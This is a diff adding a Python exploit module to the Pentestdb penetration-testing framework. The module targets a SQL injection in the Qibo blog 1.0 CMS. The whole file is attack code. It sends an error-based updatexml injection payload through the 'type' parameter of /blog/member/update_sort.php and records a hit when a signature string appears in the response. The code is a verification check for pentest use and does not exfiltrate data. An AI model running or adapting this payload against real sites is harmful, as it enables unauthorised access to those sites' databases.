@@ -1,0 +1,44 @@
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+
+'''
+Pentestdb, a database for penetration test.
+Copyright (c) 2015 alpha1e0
+'''
+
+
+from script.libs.exploit import Exploit
+from script.libs.exploit import Result
+
+
+
+class QiboblogSI(Exploit):
+    expName = u"齐博blog type SQL注入"
+    version = "1.0"
+    author = "alpha1e0"
+    language = "php"
+    appName = "qibocms"
+    appVersion = "blog 1.0"
+    reference = ['http://www.wooyun.org/bugs/wooyun-2015-098582']
+    description = u'''
+        齐博博客系统1.0
+        需登录（提供cookie参数）
+    '''
+
+    def _verify(self):
+        result = Result(self)
+
+        sig = '9876541'
+        params = "?step=1"
+        payload = {"type": "area where 1=(updatexml(1,concat(0x5e24,(select {0}),0x5e24),1))#".format(sig)}
+        
+        url = self.urlJoin("/blog/member/update_sort.php")
+        response = self.http.get(url+params, params=payload)
+
+        if response.status_code==200:
+            if sig in response.content:
+                result['fullpath'] = url
+                result['payload'] = response.request.url
+
+        return result
+
